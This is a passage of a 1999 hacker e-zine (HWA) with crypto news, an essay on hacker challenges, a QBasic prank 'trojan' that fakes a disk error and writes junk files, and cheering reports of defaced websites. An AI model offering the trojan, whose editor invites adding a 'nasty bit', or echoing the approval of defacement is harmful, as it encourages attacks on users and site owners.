+      product is secure.
+      
+      Conclusion: Separating the Good from the Bad
+      
+      These snake-oil warning signs are neither necessary nor sufficient criteria
+      for separating the good cryptography from the snake oil.  Just as there
+      could be insecure products that don't trigger any of these nine warning
+      signs, there could be secure products that look very much like snake oil.
+      But most people don't have the time, patience, or expertise to perform the
+      kind of analysis necessary to make an educated determination.  In the
+      absence of a Food-and-Drug-Administration-like body to regulate
+      
+cryptography, the only thing a reasonable person can do is to use warning
+      signs like these as guides.
+      
+      
+      Further reading: The "Snake Oil" FAQ is an excellent source of information
+      on questionable cryptographic products, and a good way to increase the
+      sensitivity of your bullshit detector.  Get your copy at:
+      <http://www.interhack.net/people/cmcurtin/snake-oil-faq.html>.
+      
+
+       @HWA
+       
+ 11.1  U.S has new interim crypto legislature
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      Contributed by Ed, from CryptoGram a newsletter for all things crypto
+
+      The U.S. has new interim cryptography export regulations.  The Department
+      of Commerce issued new interim regulations on encryption export controls on
+      December 31, 1998.  Products with DES can now be freely exported.  (Of
+      course, we all know that DES can be broken in 21 hours by a bunch of
+      amateurs, and a lot faster by professionals.)  Products with any key length
+      can be exported to insurance companies, medical end-users, and online
+      merchants (only for buying and selling goods), under the current exception
+      available for banks.  Corporations can export to their subsidiaries for
+      "internal company proprietary use"; some of this extends to partners of
+      American companies.  Some of the licensing requirements on export of key
+      escrow/key recovery systems have been removed.  These new regulations,
+      announced in September, are targeted towards large corporations.
+      Restrictions on the exports of strong encryption used for private,
+      non-commercial reasons is still strictly limited.  Comments on the rules
+      are due March 1, 1998.  A copy of the rules is available at:
+      
+http://www.epic.org/crypto/export_controls/bxa-regs-1298.html
+      
+      France reversed its long-standing position as being one of the most
+      anti-cryptography countries in the world.  On January 19, Prime Minister
+      Lionel Jospin announced the French government is relaxing its current
+      restrictive policy on encryption.  Under the new policy, a key escrow
+      system of "Trusted Third Parties" will no longer be required for domestic
+      use, the 1996 law requiring TTPs will not be implemented, and users will be
+      able to use up to 128-bit encryption without restrictions until a new law
+      which
+      eliminates all restrictions is enacted.  Rah rah.  The announcement is
+      available in French at:
+      
+http://www.premier-ministre.gouv.fr/PM/D190199.HTM
+      
+http://www.internet.gouv.fr/francais/textesref/cisi190199/decis1.htm
+      
+http://www.internet.gouv.fr/francais/textesref/cisi190199/decis2.htm
+      and a translation is at:
+      
+http://slashdot.org/articles/99/01/19/1255234.shtml
+      
+      In addition to adding a unique processor ID (see below) to its Pentium III
+      chip, Intel is adding a hardware random number generator.  This is
+      excellent news.  I know nothing about how it works (or even if it is any
+      good), but using techniques such as Yarrow, we can take even a mediocre
+      hardware random number generator and turn it into something that is good
+      for cryptographic applications.
+      
+      There's a new Word-based virus named Caligula.  Caligula steals a
+      user's PGP key ring and sends it to the creators' FTP site.  According
+      to Network Associates (owners of PGP, having bought it in 1997), this
+      doesn't compromise PGP security because the key ring file is useless
+      without the passphrase.  This seems a bit optimistic; once the private key
+      
+ring is known, PGP's security level goes from unbreakable to that of a
+      standard hashed passphrase.  And most people choose lousy passphrases.
+      
+http://www.techweb.com/wire/story/TWB19990205S0011
+      
+      Sun's Scott McNealy announced that we all have no privacy anyway, and might
+      as well get used to it.  All the more troubling, Sun is a member of the
+      Online Privacy Alliance.  With an attitude like McNealy's, is it hard to
+      believe that "an industry coalition that seeks to head off government
+      regulation of online consumer privacy in favor of an industry
+      self-regulation approach" has my best interests at heart?
+      
+http://www.wired.com/news/news/politics/story/17538.html
+      
+      SECRET POWER is an excellent book about project Echelon, the NSA's secret
+      program designed to eavesdrop on pretty much every piece of communication
+      in the world.  The book isn't available in the U.S. (Amazon.com never heard
+      of it, and I got my copy from a friend in New Zealand), but CovertAction
+      Quarterly has an excellent article on the topic by the author:
+      
+http://www.caq.com/caq59/CAQ59GlobalSnoop.html
+      And if you want to try to get the book, here are the details:  Nicky Hager,
+      SECRET POWER, Craig Potton Publishing (Box 555, Nelson, New Zealand), 1996.
+      See also:  http://www.gn.apc.org/duncan/echelon-dc.htm
+      
+ 12.0  The Hacker Challenge by Qubik
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     The Hacker Challenge
+
+     By: Qubik (qubik@bikkel.com)
+     originally posted on HNN in BufferOverflow.
+
+     You have probably read about them and some of you may have
+     even participated in one or two. Hacker challenges; where your
+     asked to bypass the latest security measure implemented into
+     technology which is already, prior to testing, dubbed as the latest in
+     computer protection. But for what in return? Most challenges offer a
+     reward of some sorts, a reward which is more often than not, a five
+     or six figure with a dollar sign placed neatly at the beginning. 
+
+     So just what is the deal with these challenges? What purpose do
+     they really serve and are they just marketing ploys? 
+
+     I'd like you to imagine for a moment that you're an administrator of a
+     small corporate network. It's not the most exciting of jobs, and you
+     don't have time to keep up with the latest going ons in the security
+     scene. Your network has been attacked a few times before, and
+     you start to think about upgrading your security. So where do you
+     start? 
+
+     Where else would you start, but the internet? It's the worlds largest
+     resource, and every good company dealing with network security, is
+     bound to be on the internet somewhere. So you use a search
+     engine or two and you come across a web site for a new state of
+     the art firewall, who's manufacturers claim it resisted every hacker
+     that attempted to hack it at a recent hacker convention. Your
+     amazed, surely their high price tag is nothing for complete
+     security!? 
+
+     Only what if it is all a clever ploy, haven't you got to ask yourself
+     just how many people actually tried to hack into that particular
+     piece of software? Haven't you got to look into the reputation of the
+     manufacturer? Of course you do! To be sure, you've got to ask for
+     the cold hard facts, not the marketing babble! 
+
+     There are serious flaws in many hacker challenges, not the least
+     being that most 'real' hackers only hear about them after they've
+     finished. This makes you wonder just who took part, and how they
+     found out about it. 
+
+     It's not uncommon for hackers and security analysts to earn wages
+     in excess of six figures, and to earn such wages, you've got to be
+     either very lucky, or very busy. So what's your guarantee that a
+     hacker who actually knows what he is doing, actually took the time
+     out to earn a, comparatively, small ten thousand? You have no
+     guarantee at all, why on earth should he or she bother? 
+
+     Next ask yourself whether real hackers would want to find all those
+     bugs in that new technological innovation. Surely their only going to
+     end up making their job, of hacking, harder by pointing them out? 
+
+     However, A low level source code analysis of a piece of software or
+     a close look at hardware by reputable third party security analysis
+     company will delay product ship times and cost a lot more than
+     setting up a hacker challenge. Not to mention that it has nowhere
+     near the same marketing punch. Display your product at an
+     upcoming convention and let people bang on it for a weekend and
+     then claim "Product X survives Hacker Challenge." Makes a great
+     press release. 
+
+     It all seems rather corrupt, with companies hiding the truth and
+     rubbing their hands at the millions they make. A ten thousand dollar
+     reward seems rather pathetic, when your earning ten times that
+     kind of money. Surely these companies know this, are they in fact
+     attempting to social engineer the hackers or maybe worse their
+     customers? 
+
+     But it's not all like that, there are plenty of genuine challenges out
+     there. Some have been set up to test software and, now more and
+     more, hardware, others testing entire networks. For example,
+     recently the Quebec government is enlisting the aid of hackers to
+     test its networks and to research new ways of protecting those
+     networks. 
+
+     So what can we say about hacker challenges? Do they really prove
+     how secure a product is? I don't think so, the fact that most aren't
+     officially announced to the hacker public and that they are often
+     deliberately misinterpret, doesn't give a good impression. But then,
+     who should a company go to? It's not the easiest of tasks in the
+     world, to announce such a challenge. 
+
+     Hack at your own discretion, don't be afraid to take part in a hacker
+     challenge, but don't take the word of the manufacturer, when they
+     say it's secure, just because a few passers by a convention typed a
+     few keys on a keyboard. There will always be flaws in hardware and
+     software, it's up to us to the true hacker to find and fix them,
+     whether we do it for the companies maketing campaign, or for
+     personal gratification. 
+
+
+
+ 13.0  #13 A BASIC Trojan, 
+       ~~~~~~~~~~~~~~~~~~~  
+ 
+       Type it in and run it .. in this form its benign but once compiled with a
+       nasty bit (use your imagination) it can do anything u want it to... - Ed
+       
+      <SNIP>
+      ' written in Qbasic 2.0
+      ' public domain 1989 Cruciphux 
+      ' warning bogus 'code' follows;       
+      randomize timer
+      
+      print "C:\"
+      print "Drive error, fat unreadable."
+      input "press any key to restart.";a$
+      shell "dir"
+     
+      1 a$=inkey$
+        if a$="" goto 1
+        i=150
+      
+      2 print "Volume in dri e C has no labe"
+      print "Directory of C:\ôøØ€sucker"
+      for xx=1 to 500:next
+      for t=1 to 20
+      close 1:open "O",1,"xxxxxxxx.xxx"
+      print #1,"x"
+      
+      b=int(24*rnd+1)
+      for x = 1 to b
+      a=int(i*rnd+1)
+      if a<>12 then print chr$(a);
+      next:next
+      
+      goto 1
+      <SNIP>
+      
+      I know its lame but I know some of you will have fun with this ... ;-)
+      
+      @HWA     
+
+ AD.S  ADVERTISING.           The HWA black market                    ADVERTISEMENTS.
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+            *** IT HAS BEEN FOUR YEARS! *** F R E E  M I T N I C K  **NOW!**
+       
+       www.2600.com www.freekevin.com www.kevinmitnick.com www.2600.com www.freekevi
+       n.com www.kevinmitnick.com www.2600.com www.freekevin.com www.kevinmitnick.co
+       m www.2600.com ########################################ww.2600.com www.freeke
+       vin.com www.kev#  Support 2600.com and the Free Kevin #.com www.kevinmitnick.
+       com www.2600.co#  defense fund site, visit it now! .  # www.2600.com www.free
+       kevin.com www.k#           FREE KEVIN                 #in.com www.kevinmitnic
+       k.com www.2600.########################################om www.2600.com www.fre
+       ekevin.com www.kevinmitnick.com www.2600.com www.freekevin.com www.kevinmitnic
+       k.com www.2600.com www.freekevin.com www.kevinmitnick.com www.2600.com www.fre
+       
+       
+       To place an ad in this section simply type it up and email it to 
+       hwa@press,usmc.net, put AD! in the subject header please. - Ed
+       
+          
+  H.W  Hacked websites
+       ~~~~~~~~~~~~~~~
+       
+       Note: The hacked site reports stay, especially with some cool hits by
+       groups like H.A.R.P, go get em boyz racism is a mugs game! - Ed
+     
+       Feb 20th 1999
+       When I visited www.hackernews.com today I was greeted with this:
+       
+       Index of /
+
+       Name                      Last modified     Size  Description
+       
+       [DIR] Parent Directory       20-Feb-99 01:14  -
+      
+      Were they hacked? www.l0pht.com is not answering HTTP requests... more
+      on this when we find out what went down. - Ed
+      
+       
+      http://www.200cigarettes.com/
+      Contributed by Spikeman  Feb 20th 1999-
+        
+      Crappy Movies - Frequently Asked Questions 
+        
+      
+      
+      Why does MTV suck? 
+      MTV sucks because they play crappy videos and they have stupid television
+      shows which are harder to watch than the insipid movies they endorse. The
+      only programing station worse than MTV is WB. I often wonder what is
+      harder to watch: MTV's The Real Worl d and its cast of cretins or Moesha.
+      That's probably because I watch too much TV to begin with. But that's
+      another issue all together. 
+      
+      
+      You guys seem pretty knoweldgable about what sucks and what doesn't, where
+      can I talk to you guys to find out more? 
+      irc.psychic.com It's cool there. Uhm, yeah. 
+      
+      
+      Why did you guys hack the 200 Cigarettes web site? The movie isn't even
+      out yet. 
+      Because we know it will suck. MTV endorses it, thusly, it sucks. Courtney
+      Love is in it, thusly, it will suck. Robert Deniro is not in it, thusly,
+      it will suck. It's another Gen-Xish type movie that I find very insulting.
+      What ever happened to quality movies about serial killers and mobsters
+      blowing each other up? I don't give a shit about some crappy bar scene in
+      some far away, imaginary candyland that Paramount created to make them
+      millions of dollars off rich, suburban white kids with too much ti me and
+      apparently too much money on their hands. 
+      
+      
+      Who is that guy on MTV's Road Rules that wears the r00t hat? 
+      No clue. But whoever he is he's not a very snappy dresser and he seems to
+      have a little trouble in social situations. He also seems to have
+      difficulties communicating effectively with the sista among them. I like
+      how MTV always sticks in their token black person, or token asian person,
+      or token gay person, to fill the show out so it's a little more P.C.. It's
+      pretty cool how there's always some white person that likes to fight with
+      the token black person all the while MTV capitalizes off of it. And,
+      honestly, would you wear that r00t hat in public? If the answer is yes,
+      please stop reading this, get up, go outside and lie down in the street
+      until a car runs you over and your brains squirt out all over the road
+      causing many accidents and traffic delays. Because you are a dork. 
+      
+      
+      Where should I go to meet you guys again? 
+      irc.psychic.com 
+      
+      
+      Aren't you guys going to speak spanish and talk about Venezuela or some
+      other opressed South American country? 
+      Yes. Arriba la raza. Yo quiero Taco Bell. And free Venezuela or something. 
+      
+      
+      Who else should we free? 
+      Kevin Mitnick, Mumia Abu-Jamal and Truman. Oh wait, Truman got out at the
+      end. Okay, scratch the Truman thing. I wonder how much Jim Carrey got paid
+      for that movie. I'm sure it's too much. 
+      
+      
+      Courtney Love is looking kinda skanky, how do you guys feel about her
+      doing movies? 
+      The People vs. Larry Flynt was good, with no thanks from her, if ya ask
+      me. Courtney Love is not only a crappy actress, but she's a crappy
+      singer/guitarist and her band sucks too. Kurt Kaboom wasn't as great as
+      everyone thinks as well. Neither was Tupac now that we're on the subject
+      of celebrities who have died from gunshot wounds. Stupid celebrities. 
+      
+      
+      What other celebrities died of gunshot wounds? 
+      I don't know. I think that guy who played Hogan on Hogan's heroes did. JFK
+      did. Abraham Lincoln, does he count? Robert Kennedy. Biggie Smalls. The
+      old bass player from Metallica had a bus fall on his head. That's kinda
+      cool. Does he count? 
+      
+      
+      Where again? 
+      irc.psychic.com 
+      
+      
+      Will you guys keep on hacking movie sites to tell us they suck? 
+      Most likely. 
+
+
+      You guys rock, can I have your autographs. 
+      No. 
+  
+  
+      Please go to irc.psychic.com and tell us how lame we are and that we're
+      not as badass as we think.
+
+
+       Once again: 
+        - this page hacked by MagicFX 
+        - this page written by boomy 
+  
+  
+
+
+       GREETS BY MAGICFX TO: 
+
+
+       - The FBI (can I work for you guys?) 
+       - The CIA (I guess I'm lucky you fellows don't care about movie hacks.) 
+       - The NSA (Can I have one of your computers?  C'mon, you  got plenty!) 
+
+
+        and:  All my friends :) 
+  
+
+
+       SHOUT OUTS BY BOOMY TO: 
+  
+       - VH1, for not putting out crappy movies like MTV. 
+  
+  
+       EoA
+              
+       Feb 19th 1999
+       contributed by lsd44 
+       
+       S C R E A M of H.A.R.P (Hackers Against Racist Parties) has
+       cracked whitepower.com. This is the same person who cracked
+       the Klu Klux Klan a few days ago. 
+
+       Whitepride.com
+       HNN Cracked Pages Archive 
+
+       HNN recieved reports that the following sites had been cracked:
+       http://www.andygrace.com
+       http://www.netatnite.com
+       http://home.serve.net
+       
+       Feb17th 1999
+       Collected by sAs- Contributed by dunkelsite from HNN http://www.hackernews.com/
+       
+       Venezuela Cracked
+       At dawn local time on February 16, 1999, www.cordiplan.gov.ve
+       and www.ipasme.gov.ve where cracked by ^^DarDdEath^^ and
+       Dunkelseite respectively. In both cases the home page was
+       changed to protest against bad government, corruption and the
+       suffering of 80% of the Venezuelans who live in critical poverty. 
+
+       HNN Cracked Pages Archive (url:http://www.hackernews.com/archive/crackarch.html)
+       Central Office of Coordination and Planning (url:http://www.cordiplan.gov.ve)
+       
+       Collected by sAs- Feb 15th  contributed by Anonymous from HNN 
+       
+       Cracked
+       (From HNN http://www.hackernews.com/ rumours section)
+       We have recieved reports that the following sites have been
+       cracked by the following people. 
+
+       hakb0y, opt1mus, RazaMExicana 
+       http://harry.lbl.gov
+       http://www.cbvm.net
+       http://www.yauni.co.kr
+       http://www.bcb.gov.bo
+       http://work.go.kr
+       
+       @HWA
+       
+       _________________________________________________________________________
+                 
+  A.0                              APPENDICES
+       _________________________________________________________________________
+        
+  
+  
+  A.1  PHACVW, sekurity, security, cyberwar links
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+       The links are no longer maintained in this file, there is now a 
+      links section on the http://welcome.to/HWA.hax0r.news/ url so check
+      there for current links etc.
+    
+      The hack FAQ (The #hack/alt.2600 faq)
+      http://www-personal.engin.umich.edu/~jgotts/underground/hack-faq.html
+    
+      Hacker's Jargon File (The quote file)
+      http://www.lysator.liu.se/hackdict/split2/main_index.html
+    
+   
+
+      International links:(TBC)
+      ~~~~~~~~~~~~~~~~~~~~~~~~~
+      
+      Foreign correspondants and others please send in news site links that
+      have security news from foreign countries for inclusion in this list
+      thanks... - Ed
+      
+      Netherlands...: http://security.pine.nl/
+      Russia........: http://www.tsu.ru/~eugene/
+      Indonesia.....: http://www.k-elektronik.org/index2.html
+                      http://members.xoom.com/neblonica/
+      Brasil........: http://www.psynet.net/ka0z
+                      http://www.elementais.cjb.net           
+
+    Got a link for this section? email it to hwa@press.usmc.net and i'll 
+    review it and post it here if it merits it. 
+    
+    
+
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-  
+    --EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--       
+       
+    © 1998, 1999 (c) Cruciphux/HWA.hax0r.news
+    (r) Cruciphux is a trade mark of Huge Whales of Armenia
+    
+
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-
+  
+     Hackerz Without Attitudez Information Warfare Alliance Website
+     Opening soon:
+                          www.hwa-iwa.org
+                         
+    
+     --EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-
+   [ 28 63 29 20 31 39 39 39 20 63 72 75 63 69 70 68 75 78 20 68 77 61 ]
+       [45:6E:64]-[28:63:29:31:39:39:38:20:68:77:61:20:73:74:65:76:65]     
